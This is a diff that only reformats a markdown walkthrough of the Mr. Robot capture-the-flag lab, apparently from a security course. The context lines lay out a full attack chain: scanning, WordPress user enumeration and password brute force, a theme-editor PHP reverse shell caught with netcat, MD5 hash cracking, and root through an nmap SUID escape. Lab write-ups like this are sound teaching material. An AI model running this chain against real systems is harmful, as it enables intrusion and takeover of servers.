@@ -73,6 +73,7 @@ flowchart TD
 **Reason:** identify open ports and running services as the foundation for attack planning.
 
 **Command:**
+
 ```bash
 sudo nmap -sC -sV -p- <target>
 ```
@@ -80,6 +81,7 @@ sudo nmap -sC -sV -p- <target>
 **Expected outcome:** discover HTTP and possibly SSH services on a Linux host.
 
 **Actual outcome — open ports:**
+
 - 22/tcp (SSH, filtered in some variants)
 - 80/tcp (HTTP / Apache)
 - 443/tcp (HTTPS)
@@ -98,6 +100,7 @@ sudo nmap -sC -sV -p- <target>
 Visiting `http://<target>/` presents a themed Mr. Robot terminal interface with the `fsociety` branding. Several commands in the UI reveal narrative flavor but little structural exposure.
 
 **Check robots.txt:**
+
 ```bash
 curl http://<target>/robots.txt
 ```
@@ -105,13 +108,15 @@ curl http://<target>/robots.txt
 **Expected outcome:** discover hidden paths or files the developer didn't intend to be indexed.
 
 **Actual outcome — contents:**
-```
+
+```text
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
 ```
 
 **Finding:** `key-1-of-3.txt` is immediately readable:
+
 ```bash
 curl http://<target>/key-1-of-3.txt
 ```
@@ -131,7 +136,7 @@ wc -l fsocity_unique.dic   # ~11,450 unique lines
 > [!NOTE]
 > Deduplication reduced the wordlist from ~858k to ~11.5k lines — a **75× speedup** for no loss of coverage. Always deduplicate before brute-forcing.
 
-_Evidence: robots.txt output and key-1-of-3.txt contents._
+*Evidence: robots.txt output and key-1-of-3.txt contents (demonstrated live during lab; source DOCX did not embed per-step screenshots for this room).*
 
 ---
 
@@ -147,6 +152,7 @@ gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
 **Expected outcome:** discover WordPress admin paths if the CMS is WordPress.
 
 **Actual outcome — notable discoveries:**
+
 - `/wp-admin` → WordPress admin login redirect
 - `/wp-login.php` → login form
 - `/wp-content/` → WP content (plugins/themes/uploads)
@@ -154,7 +160,7 @@ gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
 
 **Finding:** WordPress confirmed. Pivot to WordPress-specific enumeration.
 
-_Evidence: Gobuster output showing discovered WordPress paths._
+*Evidence: Gobuster output showing discovered WordPress paths.*
 
 ---
 
@@ -179,7 +185,7 @@ Alternatively, WordPress's login error messages leak usernames by design:
 
 **Result:** `elliot` is a valid username (themed to the show's protagonist).
 
-_Evidence: WPScan user enumeration output confirming `elliot`._
+*Evidence: WPScan user enumeration output confirming `elliot`.*
 
 ---
 
@@ -203,7 +209,7 @@ wpscan --url http://<target>/ \
 > [!NOTE]
 > Because the wordlist was deduplicated (Step 2), the brute-force completed in minutes rather than hours. Wordlist optimization is a practical skill that matters in time-boxed engagements.
 
-_Evidence: WPScan output showing successful password discovery._
+*Evidence: WPScan output showing successful password discovery.*
 
 ---
 
@@ -219,11 +225,13 @@ _Evidence: WPScan output showing successful password discovery._
 Edit to set `$ip` to attacker IP and `$port` to listener port.
 
 **Listener:**
+
 ```bash
 nc -lvnp 4444
 ```
 
 **Trigger payload:**
+
 ```bash
 curl http://<target>/wp-content/themes/<theme>/404.php
 ```
@@ -236,6 +244,7 @@ curl http://<target>/wp-content/themes/<theme>/404.php
 > The WordPress theme editor is one of the most dangerous features in any CMS. Any admin-level compromise of WordPress gives an attacker arbitrary PHP execution — effectively full RCE on the web server.
 
 **Shell upgrade** — convert the raw shell into an interactive PTY:
+
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -243,7 +252,7 @@ export TERM=xterm
 stty raw -echo; fg; reset
 ```
 
-_Evidence: reverse shell connection in netcat listener; shell upgrade to interactive PTY._
+*Evidence: reverse shell connection in netcat listener; shell upgrade to interactive PTY.*
 
 ---
 
@@ -253,6 +262,7 @@ _Evidence: reverse shell connection in netcat listener; shell upgrade to interac
 **Reason:** enumerate user home directories and discover credential material for lateral movement.
 
 Navigate filesystem looking for user homes:
+
 ```bash
 ls -la /home
 # user: robot
@@ -262,10 +272,12 @@ ls -la /home/robot
 **Expected outcome:** find files owned by another user that may contain keys or credentials.
 
 **Actual outcome — two files found:**
+
 - `key-2-of-3.txt` — readable only by `robot` user (we are `daemon`)
 - `password.raw-md5` — readable to us, contains a username and MD5 password hash
 
 **Crack the hash:**
+
 ```bash
 # Copy hash to attacker
 echo 'c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
@@ -275,19 +287,21 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
 **Cracked:** `abcdefghijklmnopqrstuvwxyz` (the alphabet — a trivially weak password stored with unsalted MD5).
 
 **Switch user:**
+
 ```bash
 su robot
 # Password: abcdefghijklmnopqrstuvwxyz
 ```
 
 **Read second key:**
+
 ```bash
 cat /home/robot/key-2-of-3.txt
 ```
 
 **Second key captured.**
 
-_Evidence: hash file contents, John the Ripper output, successful su, key contents._
+*Evidence: hash file contents, John the Ripper output, successful su, key contents.*
 
 ---
 
@@ -297,6 +311,7 @@ _Evidence: hash file contents, John the Ripper output, successful su, key conten
 **Reason:** after obtaining a user-level shell, search for misconfigured SUID binaries that allow privilege escalation to root.
 
 **SUID enumeration:**
+
 ```bash
 find / -perm -4000 2>/dev/null
 ```
@@ -314,6 +329,7 @@ nmap> !sh
 ```
 
 Alternative (if `--interactive` not supported) — Nmap NSE scripts run as the SUID owner:
+
 ```bash
 echo 'os.execute("/bin/sh")' > /tmp/shell.nse
 nmap --script /tmp/shell.nse
@@ -322,7 +338,7 @@ nmap --script /tmp/shell.nse
 > [!NOTE]
 > Modern Nmap versions (post-5.x) removed `--interactive`, but the NSE script method still works. The lesson: **any SUID binary with scripting capabilities is a potential escape path.**
 
-_Evidence: SUID enumeration output, nmap interactive shell, root confirmation._
+*Evidence: SUID enumeration output, nmap interactive shell, root confirmation.*
 
 ---
 
@@ -411,4 +427,4 @@ cat /root/key-3-of-3.txt
 
 ---
 
-_Walkthrough back-reference:_ [Course README](../README.md) · [Midterm: Pickle Rick](midterm-pickle-rick.md) · [Final: Boiler CTF](final-boiler-ctf.md)
+*Walkthrough back-reference:* [Course README](../README.md) · [Midterm: Pickle Rick](midterm-pickle-rick.md) · [Final: Boiler CTF](final-boiler-ctf.md)
